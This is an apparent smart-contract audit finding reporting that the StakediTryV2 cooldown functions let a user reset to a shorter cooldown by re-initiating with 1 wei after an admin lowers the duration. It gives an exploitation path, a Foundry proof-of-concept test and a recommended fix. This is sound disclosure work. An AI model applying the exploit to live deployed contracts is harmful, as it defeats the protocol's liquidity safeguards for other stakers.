## Title
Cooldown Period Bypass Through Re-initiation After Duration Decrease

## Summary
Users can bypass their original cooldown commitments by re-initiating cooldowns with trivial amounts (e.g., 1 wei) after the admin decreases the global cooldown duration. The `cooldownAssets()` and `cooldownShares()` functions overwrite the `cooldownEnd` timestamp while accumulating `underlyingAmount`, allowing users to reset their entire cooldown to a shorter period and access funds earlier than originally intended.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/token/wiTRY/StakediTryCooldown.sol` (StakediTryV2 contract, `cooldownAssets` function lines 96-105, `cooldownShares` function lines 109-118)

**Intended Logic:** Users who initiate cooldowns should wait the full duration committed at the time of initiation. The cooldown mechanism exists to provide protocol stability, prevent bank runs, and ensure adequate liquidity management by enforcing a waiting period before unstaking.

**Actual Logic:** When users call cooldown functions multiple times, the contract unconditionally overwrites `cooldownEnd` with a new timestamp calculated from the current `cooldownDuration`, while accumulating the `underlyingAmount`. This allows users to "reset" their cooldown timer to a shorter period if the global duration has been decreased between their cooldown calls. [1](#0-0) [2](#0-1) 

**Exploitation Path:**
1. User initiates cooldown for 1,000 iTRY when `cooldownDuration = 90 days`: `cooldownEnd = block.timestamp + 90 days`, `underlyingAmount = 1000e18`
2. On day 31, admin reduces `cooldownDuration` to 30 days via `setCooldownDuration(30 days)`
3. On day 32, user calls `cooldownAssets(1)` with just 1 wei to trigger reset: `cooldownEnd = block.timestamp + 30 days` (day 62), `underlyingAmount = 1000e18 + 1`
4. User can now call `unstake()` on day 62 to claim all 1,000+ iTRY, bypassing 28 days of the original 90-day commitment [3](#0-2) 

**Security Property Broken:** Violates the **Cooldown Integrity** invariant which states "Users must complete cooldown period before unstaking wiTRY." Users can effectively shorten their cooldown period by re-initiating after a duration decrease, bypassing the intended waiting period.

## Impact Explanation
- **Affected Assets**: iTRY tokens locked in the iTrySilo during cooldown periods, protocol liquidity management
- **Damage Severity**: Users can access their staked iTRY significantly earlier than intended (up to the difference between old and new cooldown durations). If many users exploit this simultaneously after a duration decrease, it could cause unexpected liquidity strain and defeat the purpose of cooldowns as a stability mechanism.
- **User Impact**: Any user with an active cooldown can exploit this by adding even 1 wei to reset their timer. Sophisticated users monitoring governance proposals can front-run duration decreases to maximize their advantage.

## Likelihood Explanation
- **Attacker Profile**: Any user with wiTRY shares and an active cooldown can exploit this. Requires awareness of the mechanism and monitoring of governance decisions.
- **Preconditions**: 
  - User must have initiated a cooldown before a duration decrease
  - Admin must call `setCooldownDuration()` to reduce the duration
  - User must still have wiTRY shares to initiate a new cooldown (even 1 wei worth)
- **Execution Complexity**: Single transaction after admin reduces cooldown duration. Minimal cost (gas + 1 wei of shares to burn for re-initiation).
- **Frequency**: Exploitable whenever cooldown duration is decreased, which may occur periodically based on governance decisions about protocol liquidity needs.

## Recommendation
Prevent users from resetting their cooldown timer to a shorter duration by checking if an existing cooldown would expire sooner:

```solidity
// In src/token/wiTRY/StakediTryCooldown.sol, function cooldownAssets, lines 101-102:

// CURRENT (vulnerable):
cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
cooldowns[msg.sender].underlyingAmount += uint152(assets);

// FIXED:
UserCooldown storage userCooldown = cooldowns[msg.sender];
uint104 newCooldownEnd = uint104(block.timestamp) + cooldownDuration;

// If user has existing cooldown, keep the later of the two end times
// This prevents resetting to a shorter duration but allows extending if duration increased
if (userCooldown.cooldownEnd > 0 && userCooldown.cooldownEnd > newCooldownEnd) {
    // Keep existing cooldown end time (don't allow shortening)
    newCooldownEnd = userCooldown.cooldownEnd;
}

userCooldown.cooldownEnd = newCooldownEnd;
userCooldown.underlyingAmount += uint152(assets);
```

Apply the same fix to `cooldownShares()` at lines 114-115.

**Alternative mitigation:** Revert if user attempts to add to an existing cooldown before it expires, forcing them to wait for current cooldown completion before initiating a new one:

```solidity
// Check if user has active cooldown
if (cooldowns[msg.sender].cooldownEnd > block.timestamp) {
    revert ActiveCooldownExists();
}
```

This simpler approach prevents cooldown accumulation entirely but may be less user-friendly.

## Proof of Concept
```solidity
// File: test/Exploit_CooldownReset.t.sol
// Run with: forge test --match-test test_CooldownResetExploit -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTryCooldown.sol";
import "../src/token/iTry.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Exploit_CooldownReset is Test {
    StakediTryV2 vault;
    iTry itry;
    address admin;
    address user;
    
    function setUp() public {
        admin = makeAddr("admin");
        user = makeAddr("user");
        
        // Deploy iTRY token
        vm.prank(admin);
        itry = new iTry(admin);
        
        // Deploy vault with 90-day cooldown
        vm.prank(admin);
        vault = new StakediTryV2(IERC20(address(itry)), admin, admin);
        
        // Mint iTRY to user and approve vault
        vm.prank(admin);
        itry.mint(user, 2000e18);
        
        vm.prank(user);
        itry.approve(address(vault), type(uint256).max);
    }
    
    function test_CooldownResetExploit() public {
        // SETUP: User deposits and initiates cooldown with 90-day duration
        vm.startPrank(user);
        vault.deposit(1000e18, user);
        
        uint256 initialShares = vault.balanceOf(user);
        vault.cooldownAssets(1000e18); // Initiate cooldown for 1000 iTRY
        vm.stopPrank();
        
        // Record initial cooldown end (should be ~90 days from now)
        (uint104 initialCooldownEnd, uint256 initialAmount) = vault.cooldowns(user);
        uint256 expectedInitialEnd = block.timestamp + 90 days;
        
        assertEq(initialCooldownEnd, expectedInitialEnd, "Initial cooldown should be 90 days");
        assertEq(initialAmount, 1000e18, "Initial amount should be 1000 iTRY");
        
        // Advance 31 days
        vm.warp(block.timestamp + 31 days);
        
        // EXPLOIT: Admin reduces cooldown duration to 30 days
        vm.prank(admin);
        vault.setCooldownDuration(30 days);
        
        // User adds 1 wei to trigger cooldown reset
        vm.startPrank(user);
        vault.deposit(1, user); // Deposit 1 wei to get shares
        vault.cooldownAssets(1); // Add 1 wei to cooldown
        vm.stopPrank();
        
        // VERIFY: Cooldown end is now much sooner
        (uint104 exploitedCooldownEnd, uint256 exploitedAmount) = vault.cooldowns(user);
        uint256 expectedExploitedEnd = block.timestamp + 30 days; // Current time (day 31) + 30 days = day 61
        
        assertEq(exploitedCooldownEnd, expectedExploitedEnd, "Cooldown reset to shorter duration");
        assertEq(exploitedAmount, 1000e18 + 1, "Amount accumulated");
        
        // User gained early access: original end was day 90, new end is day 61
        uint256 daysGained = (initialCooldownEnd - exploitedCooldownEnd) / 1 days;
        assertEq(daysGained, 29, "User bypassed 29 days of cooldown");
        
        // User can now unstake at day 61 instead of day 90
        vm.warp(exploitedCooldownEnd);
        vm.prank(user);
        vault.unstake(user);
        
        // Verify user received all funds
        assertEq(itry.balanceOf(user), 1000e18 + 1, "User successfully unstaked all funds early");
    }
}
```

## Notes

This vulnerability arises from the design choice to allow users to accumulate multiple cooldown requests into a single cooldown slot. While the `+=` operator for `underlyingAmount` suggests this accumulation is intentional, the unconditional overwrite of `cooldownEnd` creates an exploitable bypass when combined with governance-driven cooldown duration changes.

The cross-chain variant in `StakediTryCrosschain.sol` uses the same pattern in `_startComposerCooldown()` [4](#0-3) , though exploitation is limited to composer role holders.

The special case where setting `cooldownDuration = 0` allows immediate unstaking via the conditional check in `unstake()` [5](#0-4)  suggests the protocol intends for duration changes to affect existing cooldowns in some cases, but the lack of protection against timer shortening creates this vulnerability.

### Citations

**File:** src/token/wiTRY/StakediTryCooldown.sol (L80-92)
```text
    function unstake(address receiver) external {
        UserCooldown storage userCooldown = cooldowns[msg.sender];
        uint256 assets = userCooldown.underlyingAmount;

        if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0) {
            userCooldown.cooldownEnd = 0;
            userCooldown.underlyingAmount = 0;

            silo.withdraw(receiver, assets);
        } else {
            revert InvalidCooldown();
        }
    }
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L101-102)
```text
        cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
        cooldowns[msg.sender].underlyingAmount += uint152(assets);
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L114-115)
```text
        cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
        cooldowns[msg.sender].underlyingAmount += uint152(assets);
```

**File:** src/token/wiTRY/StakediTryCrosschain.sol (L171-178)
```text
        uint104 cooldownEnd = uint104(block.timestamp) + cooldownDuration;

        // Interaction: External call to base contract (protected by nonReentrant modifier)
        _withdraw(composer, address(silo), composer, assets, shares);

        // Effects: State changes after external call (following CEI pattern)
        cooldowns[redeemer].cooldownEnd = cooldownEnd;
        cooldowns[redeemer].underlyingAmount += uint152(assets);
```
